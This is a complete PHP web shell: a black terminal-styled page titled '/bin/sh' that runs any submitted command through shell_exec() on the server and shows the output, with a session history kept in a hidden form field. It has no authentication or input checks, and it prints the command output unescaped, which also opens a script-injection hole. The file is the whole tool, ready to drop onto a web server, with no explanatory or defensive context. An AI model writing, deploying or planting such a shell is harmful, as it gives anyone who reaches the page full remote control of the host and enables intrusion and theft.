<!doctype html>
<html>
	<head>
		<title>/bin/sh</title>
<style>
body,input {
	background-color: black;
	color: white;
	font-family: monospace;
	font-size: 13px;
}

pre {
	margin: 0;
}

input {
	border: 0;
}
</style>
	</head>
	<body>
<?php
$history = "";
if(!empty($_POST["history"])) {
	$history .= json_decode($_POST["history"]);
}
if(!empty($_POST["command"])) {
	$command = $_POST["command"];
	$command_exec = shell_exec($command);
	$history .= "$ " . $command . "\n" . $command_exec;
}
if(!empty($history)) {
?>
		<div id="history">
			<pre><?=$history?></pre>
		</div>
<?php }
?>		<form action="" method="POST">
			$ <input style="width: auto; cursor: text" name="command" autofocus="autofocus" />
			<input type="hidden" name="history" value='<?=json_encode($history) ?>' />
			<input style="visibility: hidden;" type="submit" />
		</form>
	</body>
</html>
